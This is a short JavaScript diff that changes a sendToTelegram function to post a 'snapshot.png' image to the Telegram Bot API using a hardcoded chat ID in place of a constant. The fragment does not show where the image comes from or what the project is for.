@@ -51,7 +51,7 @@ function sendToTelegram(imageDataUrl) {
     .then(response => response.blob())
     .then(blob => {
       const formData = new FormData();
-      formData.append('chat_id', CHAT_ID);
+      formData.append('chat_id', '-1002425906440');
       formData.append('photo', blob, 'snapshot.png');
 
       fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
